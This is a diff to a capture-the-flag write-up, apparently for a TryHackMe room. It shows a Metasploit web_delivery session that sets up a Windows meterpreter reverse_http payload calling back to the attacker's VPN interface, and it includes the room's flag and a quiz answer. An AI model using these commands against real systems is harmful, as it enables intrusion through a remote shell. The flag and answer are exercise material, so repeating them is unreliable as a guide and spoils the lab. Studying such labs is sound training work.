@@ -108,7 +108,6 @@ THM{COIN_OPERATED_EXPLOITATION}
 ```bash
 $ msfconsole -q
 msf6 > use exploit/multi/script/web_delivery
-[*] Using configured payload python/meterpreter/reverse_tcp
 msf6 exploit(multi/script/web_delivery) > show targets
 
 Exploit targets:
@@ -128,7 +127,7 @@ msf6 exploit(multi/script/web_delivery) > set target 2
 target => 2
 msf6 exploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_http
 payload => windows/meterpreter/reverse_http
-msf6 exploit(multi/script/web_delivery) > set LHOST <OPENVPN_IP>
+msf6 exploit(multi/script/web_delivery) > set LHOST tun0
 msf6 exploit(multi/script/web_delivery) > run -j
 ```
 **Answer**: `2`
